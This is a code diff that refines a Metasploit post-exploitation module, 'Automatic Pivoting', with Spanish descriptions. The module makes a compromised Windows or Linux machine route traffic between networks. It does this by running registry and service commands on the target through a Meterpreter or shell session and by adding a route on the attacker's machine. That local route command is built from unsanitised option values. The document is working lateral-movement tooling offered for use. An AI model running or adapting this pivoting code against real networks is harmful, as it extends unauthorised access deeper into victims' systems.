@@ -10,8 +10,8 @@ class MetasploitModule < Msf::Post
 
   def initialize(info={})
     super( update_info( info,
-        'Name'          => 'to add here',
-        'Description'   => %q{Configura el equipo como pivot entre dos o mas redes. Funciona para equipos Windows y Linux.},
+        'Name'          => 'Automatic Pivoting',
+        'Description'   => %q{Configura el equipo como pivot entre dos o mas redes. Funciona para equipos Windows y Linux. Es necesario tener privilegios de administrador.},
         'License'       => MSF_LICENSE,
         'Author'        => 
            [
@@ -19,15 +19,15 @@ class MetasploitModule < Msf::Post
              'none <none[at]gmail.com>'
            ],
 		'Platform'      => [ 'win', 'linux'],
-        'SessionTypes'  => [ 'meterpreter']
+        'SessionTypes'  => [ 'meterpreter','shell']
       ))
 
     register_options(
       [
 		# OptBool.new( 'SYSTEMINFO', [ true, 'True if you want to get system info', 'TRUE' ])
-		OptString.new('NET',    [true, 'Red que pretendemos alcanzar']),
-		OptString.new('RHOST',    [true, 'IP de la maquina remota']),
-		OptString.new('LOS',    [true, 'Sistema Operativo local'])
+		OptString.new('NET',    [true, 'Red que pretendemos alcanzar (Ej: 10.0.0.0/24)']),
+		OptString.new('RHOST',    [true, 'IP de la maquina PIVOT (nuestra red)']),
+		OptString.new('LOS',    [true, 'Sistema Operativo local (linux o windows)'])
       ])
   end
 	#
@@ -40,11 +40,11 @@ class MetasploitModule < Msf::Post
   	# windows
   	#
 	def windows_pivot()
-		print_line("Executing: reg add \"HKLM\\SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters\" /f /v IPEnableRouter /t REG_DWORD /d 1")
+		print_line("Enabling IP Router...")
 		print_good(cmd_exec("reg add \"HKLM\\SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters\" /f /v IPEnableRouter /t REG_DWORD /d 1"))
-		print_line("Executing: sc config RemoteAccess start= auto")
+		print_line("Enabling Routing and Remote Access service...")
 		print_good(cmd_exec("sc config RemoteAccess start= auto"))
-		print_line("Executing: net start RemoteAccess")
+		print_line("Starting Routing and Remote Access service...")
 		print_good(cmd_exec("net start RemoteAccess"))
 	end
 	#
@@ -69,13 +69,17 @@ class MetasploitModule < Msf::Post
 	#
 	# Crea la ruta en la máquina local
 	#
-		# Sustituir session.platform por la variable correcta
 		case datastore['LOS']
 	  	when 'linux'
 			#
 		  	# codigo para linux
 		  	#
-		  	system("route add -net #{datastore['NET']} gw #{datastore['RHOST']}")
+		  	print_line("Routing the new network...")
+		  	if system("route add -net #{datastore['NET']} gw #{datastore['RHOST']}")
+				print_good("Route added.")
+			else
+				print_bad("Route failed.")
+			end
 		when 'windows'
 			#
 		  	# codigo para windows
